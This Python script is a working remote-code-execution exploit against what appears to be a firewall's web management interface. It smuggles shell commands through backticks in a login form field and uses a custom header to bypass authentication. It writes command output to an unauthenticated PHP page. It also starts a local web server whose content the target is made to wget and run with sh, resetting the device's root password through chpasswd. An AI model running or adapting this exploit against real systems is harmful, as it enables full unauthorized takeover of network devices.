import threading
import socket
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if os.geteuid() != 0:
    print("Error: This script must be run as root to bind to port 80.")
    exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('0.0.0.0', 80))
if result == 0:
    print("Error: Port 80 is already in use.")
    exit(1)
sock.close()

HEADER = input("Enter header: ").strip()

HOSTNAME = input("Enter the IP: ").strip()
PAYLOAD_NAME = "great.php"

password = input("Enter the password to set for root: ").strip()
encoded_password = f"echo 'root:{password}' | chpasswd\n"

class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(encoded_password.encode())

def start_server():
    server_address = ("0.0.0.0", 80)
    httpd = HTTPServer(server_address, CustomHandler)
    httpd.serve_forever()

def run_command(command):
    try:
        response = requests.post(
            f'https://{HOSTNAME}/php/utils/createRemoteAppwebSession.php/pumpkin.js.map', 
            headers={HEADER: 'off', 'Content-Type': 'application/x-www-form-urlencoded'},
            data={
                "user": f"`echo $({command}) > /var/appweb/htdocs/unauth/{PAYLOAD_NAME}`",
                "userRole": "superuser",
                "remoteHost": "",
                "vsys": "vsys1"
            },
            verify=False
        )
        session_id = response.text.split("PHPSESSID=")[1].split("@end@")[0]

        requests.get(
            f'https://{HOSTNAME}/index.php/.js.map',
            headers={HEADER: 'off', 'Cookie': f'PHPSESSID={session_id}'},
            verify=False
        )

        final_response = requests.get(
            f'https://{HOSTNAME}/unauth/{PAYLOAD_NAME}',
            headers={HEADER: 'off', 'Cookie': f'PHPSESSID={session_id}'},
            verify=False
        )
        print(final_response.content.decode())
    except Exception as e:
        print(f"Error executing command: {e}")

def main():
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    ip_address = input("IP Address of the webserver serving the index.html: ").strip()
    print("Removing old index.html...")
    run_command("rm index.html") 
    print("Wgetting new index.html...")
    run_command(f"wget {ip_address}") 
    print("Running new index.html...")
    run_command(f"sh index.html") 

if __name__ == "__main__":
    main()
